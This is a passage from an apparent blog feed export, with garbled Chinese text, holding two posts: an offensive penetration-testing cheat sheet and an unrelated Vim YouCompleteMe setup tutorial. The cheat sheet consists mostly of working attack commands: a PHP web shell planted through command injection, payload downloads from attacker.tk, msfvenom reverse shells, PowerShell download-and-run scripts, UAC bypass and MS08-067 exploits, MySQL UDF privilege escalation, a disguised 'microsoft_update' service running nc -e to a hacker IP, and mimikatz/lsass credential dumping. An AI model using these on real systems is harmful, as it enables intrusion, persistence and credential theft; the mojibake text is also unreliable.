$&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</div><div class="line"></div><div class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</div><div class="line"></div><div class="line"># åœ¨æœåŠ¡å™¨ä¸Šä¸‹è½½ shell (phpshell.php)</div><div class="line"></div><div class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</div><div class="line"></div><div class="line"># è¿è¡Œ nc å¹¶æ‰§è¡Œ phpshell.php</div><div class="line">attacker:~$ nc -nvlp 1337</div></pre></div></div></figure><h2 id="ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨-Win7-ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„-Shell"><a href="#ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨-Win7-ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„-Shell" class="headerlink" title="ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell"></a>ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></div><div class="code"><pre><div class="line">msfvenom â€“p windows/shell_reverse_tcp LHOST=192.168.56.102 â€“f exe &gt; danger.exe</div><div class="line"></div><div class="line"># æ˜¾ç¤ºè´¦æˆ·é…ç½®</div><div class="line">net user &lt;login&gt;</div><div class="line"></div><div class="line"># Kali ä¸Šä¸‹è½½ psexec</div><div class="line"></div><div class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</div><div class="line"></div><div class="line"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  psexec.exe åˆ°ç›®æ ‡æœºå™¨</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</div><div class="line"></div><div class="line"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  danger.exe åˆ°ç›®æ ‡æœºå™¨</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</div><div class="line"></div><div class="line"># ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ç»•è¿‡ UAC:</div><div class="line"></div><div class="line">https://github.com/hfiref0x/UACME</div><div class="line"></div><div class="line"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe åˆ°ç›®æ ‡æœºå™¨</div><div class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</div><div class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</div><div class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</div><div class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</div><div class="line"></div><div class="line"># åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ Akagi64 è¿è¡Œ danger.exe </div><div class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</div><div class="line"></div><div class="line"># åœ¨ Kali ä¸Šåˆ›å»ºç›‘å¬</div><div class="line">nc -lvp 4444</div><div class="line"></div><div class="line"># ä¸‹ä¸€æ­¥å°±ä¼šåå¼¹ç»™æˆ‘ä»¬ä¸€ä¸ªæè¿‡æƒçš„ shell</div><div class="line"># ä»¥ç³»ç»Ÿæƒé™ä½¿ç”¨ PsExec è¿è¡Œ danger.exe </div><div class="line">psexec.exe â€“i â€“d â€“accepteula â€“s danger.exe</div></pre></div></div></figure><h2 id="ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨-Win7-ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„-Shell"><a href="#ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨-Win7-ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„-Shell" class="headerlink" title="ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell"></a>ä»¥æ™®é€šç”¨æˆ·èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></div><div class="code"><pre><div class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</div><div class="line"></div><div class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</div><div class="line"></div><div class="line"></div><div class="line">https://www.exploit-db.com/exploits/37049/</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ç›®æ ‡æœºå™¨æ˜¯å¦å®‰è£…äº†è¡¥ä¸ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤</div><div class="line">wmic qfe get</div><div class="line">wmic qfe | find &quot;3057191&quot;</div><div class="line"></div><div class="line"># ä¸Šä¼ ç¼–è¯‘åçš„åˆ©ç”¨ç¨‹åºå¹¶è¿è¡Œå®ƒ</div><div class="line"></div><div class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</div><div class="line"></div><div class="line"># é»˜è®¤æƒ…å†µä¸‹å…¶ä¼šä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œ cmd.exeï¼Œä½†æˆ‘ä»¬éœ€è¦æ”¹å˜æºä»£ç ä»¥è¿è¡Œæˆ‘ä»¬ä¸Šä¼ çš„ danger.exe</div><div class="line"># https://github.com/hfiref0x/CVE-2015-1701 ä¸‹è½½å®ƒå¹¶å®šä½åˆ° &quot;main.c&quot;</div><div class="line"></div><div class="line"># ä½¿ç”¨ wce.exe è·å–å·²ç™»å½•ç”¨æˆ·çš„æ˜æ–‡è´¦å·å¯†ç </div><div class="line"></div><div class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</div><div class="line"></div><div class="line">wce -w</div><div class="line"></div><div class="line"># ä½¿ç”¨ pwdump7 è·å–å…¶ä»–ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼</div><div class="line"></div><div class="line">http://www.heise.de/download/pwdump.html</div><div class="line"></div><div class="line"># we can try online hash cracking tools such crackstation.net</div><div class="line">MS08-067 â€“ ä¸ä½¿ç”¨ Metasploit</div><div class="line"></div><div class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</div><div class="line">$ searchsploit ms08-067</div><div class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</div></pre></div></div></figure><h2 id="é€šè¿‡-MySQL-Root-è´¦æˆ·å®ç°ææƒ"><a href="#é€šè¿‡-MySQL-Root-è´¦æˆ·å®ç°ææƒ" class="headerlink" title="é€šè¿‡ MySQL Root è´¦æˆ·å®ç°ææƒ"></a>é€šè¿‡ MySQL Root è´¦æˆ·å®ç°ææƒ</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</div><div class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</div><div class="line">$ gcc -g -c raptor_udf2.c</div><div class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</div><div class="line">mysql -u root -p</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; create table foo(line blob);</div><div class="line">mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));</div><div class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;</div><div class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</div><div class="line">mysql&gt; select * from mysql.func;</div><div class="line">mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);</div><div class="line"></div><div class="line">user:~$ su -</div><div class="line">Password:</div><div class="line">user:~# whoami</div><div class="line">root</div><div class="line">root:~# id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></div></div></figure><h2 id="ä½¿ç”¨-LD-PRELOAD-æ³¨å…¥ç¨‹åº"><a href="#ä½¿ç”¨-LD-PRELOAD-æ³¨å…¥ç¨‹åº" class="headerlink" title="ä½¿ç”¨ LD_PRELOAD æ³¨å…¥ç¨‹åº"></a>ä½¿ç”¨ LD_PRELOAD æ³¨å…¥ç¨‹åº</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</div><div class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</div><div class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</div></pre></div></div></figure><h2 id="é’ˆå¯¹-OpenSSH-ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡»"><a href="#é’ˆå¯¹-OpenSSH-ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡»" class="headerlink" title="é’ˆå¯¹ OpenSSH ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡»"></a>é’ˆå¯¹ OpenSSH ç”¨æˆ·è¿›è¡Œæšä¸¾æ—¶åºæ”»å‡»</h2><blockquote><p>æšä¸¾æ—¶åºæ”»å‡»(â€œEnumeration Timing Attackâ€)å±äºä¾§ä¿¡é“æ”»å‡»/æ—è·¯æ”»å‡»(Side Channel Attack)ï¼Œä¾§ä¿¡é“æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨ä¿¡é“å¤–çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åŠ è§£å¯†çš„é€Ÿåº¦/åŠ è§£å¯†æ—¶èŠ¯ç‰‡å¼•è„šçš„ç”µå‹/å¯†æ–‡ä¼ è¾“çš„æµé‡å’Œé€”å¾„ç­‰è¿›è¡Œæ”»å‡»çš„æ–¹å¼ï¼Œä¸€ä¸ªè¯å½¢å®¹å°±æ˜¯â€œæ—æ•²ä¾§å‡»â€ã€‚â€“å‚è€ƒè‡ª shotgun åœ¨çŸ¥ä¹ä¸Šçš„è§£é‡Šã€‚<br>osueta æ˜¯ä¸€ä¸ªç”¨äºå¯¹ OpenSSH è¿›è¡Œæ—¶åºæ”»å‡»çš„ python2 è„šæœ¬ï¼Œå…¶å¯ä»¥åˆ©ç”¨æ—¶åºæ”»å‡»æšä¸¾ OpenSSH ç”¨æˆ·åï¼Œå¹¶åœ¨ä¸€å®šæ¡ä»¶ä¸‹å¯ä»¥å¯¹ OpenSSH æœåŠ¡å™¨è¿›è¡Œ DOS æ”»å‡»ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># https://github.com/c0r3dump3d/osueta</div><div class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</div><div class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes â€“dos no -L userfile.txt</div></pre></div></div></figure><h2 id="ä½¿ç”¨-ReDuh-æ„é€ åˆæ³•çš„-HTTP-è¯·æ±‚ä»¥å»ºç«‹-TCP-é€šé“"><a href="#ä½¿ç”¨-ReDuh-æ„é€ åˆæ³•çš„-HTTP-è¯·æ±‚ä»¥å»ºç«‹-TCP-é€šé“" class="headerlink" title="ä½¿ç”¨ ReDuh æ„é€ åˆæ³•çš„ HTTP è¯·æ±‚ä»¥å»ºç«‹ TCP é€šé“"></a>ä½¿ç”¨ ReDuh æ„é€ åˆæ³•çš„ HTTP è¯·æ±‚ä»¥å»ºç«‹ TCP é€šé“</h2><blockquote><p>ReDuh æ˜¯ä¸€ä¸ªé€šè¿‡ HTTP åè®®å»ºç«‹éš§é“ä¼ è¾“å„ç§å…¶ä»–æ•°æ®çš„å·¥å…·ã€‚å…¶å¯ä»¥æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡ http/https éš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªè¿é€šå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></div><div class="code"><pre><div class="line"># https://github.com/sensepost/reDuh</div><div class="line"></div><div class="line"># æ­¥éª¤ 1</div><div class="line"># ä¸Šä¼  reDuh.jsp ç›®æ ‡æœåŠ¡å™¨</div><div class="line">$ http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># æ­¥éª¤ 2</div><div class="line"># åœ¨æœ¬æœºè¿è¡Œ reDuhClient </div><div class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</div><div class="line"></div><div class="line"># æ­¥éª¤ 3</div><div class="line"># ä½¿ç”¨ nc è¿æ¥ç®¡ç†ç«¯å£</div><div class="line">$ nc -nvv 127.0.0.1 1010</div><div class="line"></div><div class="line"># æ­¥éª¤ 4</div><div class="line"># ä½¿ç”¨éš§é“è½¬å‘æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹ç›®æ ‡ç«¯å£</div><div class="line">[createTunnel] 7777:172.16.0.4:3389</div><div class="line"></div><div class="line"># æ­¥éª¤ 5</div><div class="line"># ä½¿ç”¨ RDP è¿æ¥è¿œç¨‹</div><div class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</div></pre></div></div></figure><h2 id="Linux-å¸¸ç”¨å®‰å…¨å‘½ä»¤"><a href="#Linux-å¸¸ç”¨å®‰å…¨å‘½ä»¤" class="headerlink" title="Linux å¸¸ç”¨å®‰å…¨å‘½ä»¤"></a>Linux å¸¸ç”¨å®‰å…¨å‘½ä»¤</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></div><div class="code"><pre><div class="line"># ä½¿ç”¨ uid æŸ¥æ‰¾å¯¹åº”çš„ç¨‹åº</div><div class="line">find / -uid 0 -perm -4000</div><div class="line"></div><div class="line"># æŸ¥æ‰¾å“ªé‡Œæ‹¥æœ‰å†™æƒé™</div><div class="line">find / -perm -o=w</div><div class="line"></div><div class="line"># æŸ¥æ‰¾åç§°ä¸­åŒ…å«ç‚¹å’Œç©ºæ ¼çš„æ–‡ä»¶</div><div class="line">find / -name &quot; &quot; -print</div><div class="line">find / -name &quot;..&quot; -print</div><div class="line">find / -name &quot;. &quot; -print</div><div class="line">find / -name &quot; &quot; -print</div><div class="line"></div><div class="line"># æŸ¥æ‰¾ä¸å±äºä»»ä½•äººçš„æ–‡ä»¶</div><div class="line">find / -nouser</div><div class="line"></div><div class="line"># æŸ¥æ‰¾æœªé“¾æ¥çš„æ–‡ä»¶</div><div class="line">lsof +L1</div><div class="line"></div><div class="line"># è·å–è¿›ç¨‹æ‰“å¼€ç«¯å£çš„ä¿¡æ¯</div><div class="line">lsof -i</div><div class="line"></div><div class="line"># çœ‹çœ‹ ARP è¡¨ä¸­æ˜¯å¦æœ‰å¥‡æ€ªçš„ä¸œè¥¿</div><div class="line">arp -a</div><div class="line"></div><div class="line"># æŸ¥çœ‹æ‰€æœ‰è´¦æˆ·</div><div class="line">getent passwd</div><div class="line"></div><div class="line"># æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ç»„</div><div class="line">getent group</div><div class="line"></div><div class="line"># åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„ crontabs</div><div class="line">for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done</div><div class="line"></div><div class="line"># ç”Ÿæˆéšæœºå¯†ç </div><div class="line">cat /dev/urandom| tr -dc â€˜a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=â€™|fold -w 12| head -n 4</div><div class="line"></div><div class="line"># æŸ¥æ‰¾æ‰€æœ‰ä¸å¯ä¿®æ”¹çš„æ–‡ä»¶</div><div class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep â€˜^â€¦.iâ€™</div><div class="line"></div><div class="line"># ä½¿æ–‡ä»¶ä¸å¯ä¿®æ”¹</div><div class="line">chattr -i file</div></pre></div></div></figure><h2 id="å®ç”¨çš„-Windows-cmd-å‘½ä»¤"><a href="#å®ç”¨çš„-Windows-cmd-å‘½ä»¤" class="headerlink" title="å®ç”¨çš„ Windows cmd å‘½ä»¤"></a>å®ç”¨çš„ Windows cmd å‘½ä»¤</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"></div><div class="line">net localgroup Users</div><div class="line">net localgroup Administrators</div><div class="line">search dir/s *.doc</div><div class="line">system(&quot;start cmd.exe /k $cmd&quot;)</div><div class="line">sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore</div><div class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</div><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</div><div class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</div><div class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 ä½ç³»ç»Ÿ</div><div class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 ä½ç³»ç»Ÿ</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è‡ªå®šä¹‰VIMæ’ä»¶ä¸ºIDEåˆ©å™¨</title>
      <link href="/2016/12/21/vim-plugin/"/>
      <url>/2016/12/21/vim-plugin/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/vim-plugins.gif" alt="kionf"></p><blockquote><p>å¦‚å›¾æ˜¯VIMè‡ªå®šä¹‰æ’ä»¶åŠé…ç½®åçš„æ¼”ç¤ºï¼Œè™½ç„¶æœ‰Pycharmä½†æ˜¯ç®—ä¸ä¸Šè½»é‡çº§ï¼Œå†™ä¸ªè¿ç»´å°è„šæœ¬æ ¹æœ¬ç”¨ä¸åˆ°ï¼Œä¸€èˆ¬ç¬”è€…åªæœ‰åœ¨å†™Djangoæˆ–è¯»pythoné¡¹ç›®æºç çš„æ—¶å€™ä¼šç”¨ï¼Œsoæˆ‘ä»¬å¼€å§‹å§</p></blockquote><a id="more"></a><h2 id="1-å®‰è£…æ’ä»¶ç®¡ç†å·¥å…·Vundle"><a href="#1-å®‰è£…æ’ä»¶ç®¡ç†å·¥å…·Vundle" class="headerlink" title="1. å®‰è£…æ’ä»¶ç®¡ç†å·¥å…·Vundle"></a>1. å®‰è£…æ’ä»¶ç®¡ç†å·¥å…·<a href="https://github.com/VundleVim/Vundle.Vim" title="Vundleæ˜¯Vimæ’ä»¶ç®¡ç†å·¥å…·" target="_blank" rel="noopener">Vundle</a></h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle</div></pre></div></div></figure><p>ç¼–è¾‘æ–‡ä»¶~/.vimrc</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line">set nocompatible                    &quot; be iMproved</div><div class="line"></div><div class="line">filetype off                        &quot; required!</div><div class="line">set rtp+=~/.vim/bundle/vundle/</div><div class="line">call vundle#rc()</div><div class="line"></div><div class="line">&quot;my Bundle here:</div><div class="line">Bundle &apos;Valloric/YouCompleteMe&apos;&quot;ä»£ç è¡¥å…¨</div><div class="line">Plugin &apos;Yggdroot/indentLine&apos;&quot;å‚ç›´å¯¹é½çº¿</div><div class="line">Plugin &apos;Chiel92/vim-autoformat&apos;&quot;è‡ªåŠ¨è¯­æ³•ç¼©è¿›</div><div class="line"></div><div class="line">filetype plugin indent on</div><div class="line"></div><div class="line"></div><div class="line">&quot; hot key</div></pre></div></div></figure><p>ä¿®æ”¹å®Œæˆåå‘½ä»¤è¡Œæ‰§è¡Œ <code>vim +PluginInstall +qall</code> ç­‰å¾…å®‰è£…å®Œæˆï¼Œæ‰§è¡Œ<code>vim +BundleInstall +qall</code> ä¸‹è½½<strong>Valloric/YouCompleteMe</strong>åŒ…ï¼ˆå¯èƒ½ä¹…äº›ï¼‰</p><h2 id="2-ç¼–è¯‘å®‰è£…YouCompleteMe"><a href="#2-ç¼–è¯‘å®‰è£…YouCompleteMe" class="headerlink" title="2. ç¼–è¯‘å®‰è£…YouCompleteMe"></a>2. ç¼–è¯‘å®‰è£…<a href="https://github.com/Valloric/YouCompleteMe#ubuntu-linux-x64" title="ä»£ç è¡¥å…¨ç¥å™¨" target="_blank" rel="noopener">YouCompleteMe</a></h2><p>å®‰è£…ç¼–è¯‘æ‰€éœ€è½¯ä»¶ï¼š</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">sudo apt-get install build-essential cmake</div><div class="line">sudo apt-get install python-dev python3-dev</div></pre></div></div></figure><h3 id="å¯é€‰ç¼–è¯‘æ”¯æŒä»£ç è¡¥å…¨"><a href="#å¯é€‰ç¼–è¯‘æ”¯æŒä»£ç è¡¥å…¨" class="headerlink" title="å¯é€‰ç¼–è¯‘æ”¯æŒä»£ç è¡¥å…¨"></a>å¯é€‰ç¼–è¯‘æ”¯æŒä»£ç è¡¥å…¨</h3><p><strong>1. ç¼–è¯‘å…·æœ‰å¯¹Cç³»åˆ—è¯­è¨€æ”¯æŒçš„YCMï¼š</strong></p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py --clang-completer</div></pre></div></div></figure><p><strong>2. ç¼–è¯‘YCMæ²¡æœ‰Cè¯­è¨€çš„æ”¯æŒï¼š</strong></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py</div></pre></div></div></figure><p><strong>3. ç¼–è¯‘æ‰€æœ‰æ”¯æŒçš„è¯­è¨€ï¼š</strong></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd ~/.vim/bundle/YouCompleteMe</div><div class="line">./install.py --all</div></pre></div></div></figure><blockquote><p>è„šæœ¬ä¼šè‡ªåŠ¨ä¸‹è½½æ‰€éœ€åŒ…ï¼Œç¬”è€…é€‰æ‹©çš„æ˜¯ç¼–è¯‘æ‰€æœ‰æ”¯æŒè¯­è¨€å…¨éƒ¨ä¸‹æ¥å¤§å°åœ¨400MBå·¦å³</p></blockquote><h2 id="3-æŠ¥é”™è§£å†³"><a href="#3-æŠ¥é”™è§£å†³" class="headerlink" title="3. æŠ¥é”™è§£å†³"></a>3. æŠ¥é”™è§£å†³</h2><p>æŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">YouCompleteMe unavailable: requires Vim compiled with  Python 2.x support</div></pre></div></div></figure><p>åŸå› ï¼š</p><p>æ‰§è¡Œ<code>vim --version|grep python</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">-python</div><div class="line">-python3</div></pre></div></div></figure><p>vimç¼–è¯‘å®‰è£…çš„æ—¶å€™é»˜è®¤æ²¡æœ‰æ”¯æŒPython</p><p>è§£å†³ï¼š</p><p>åœ¨Debianä¸­<code>sudo apt-get install vim-nox</code></p><p>åœ¨Ubuntuä¸­<code>sudo apt-get install vim-gnome-py2</code></p><p>å…¶ä»–Linuxå‘è¡Œç‰ˆä¸­å¦‚æœæ²¡æœ‰ä¸Šè¿°è½¯ä»¶åŒ…ï¼Œéœ€è¦é‡æ–°ä¸‹è½½vimæºç é‡æ–°ç¼–è¯‘ï¼ŒåŠ é€‰é¡¹<code>--enable-python3interp=yes</code></p><p>æ›´å¤šè§£å†³æ–¹æ¡ˆï¼š<a href="http://stackoverflow.com/questions/20160902/how-to-solve-requires-python-2-x-support-in-linux-vim-and-it-have-python-2-6-6" target="_blank" 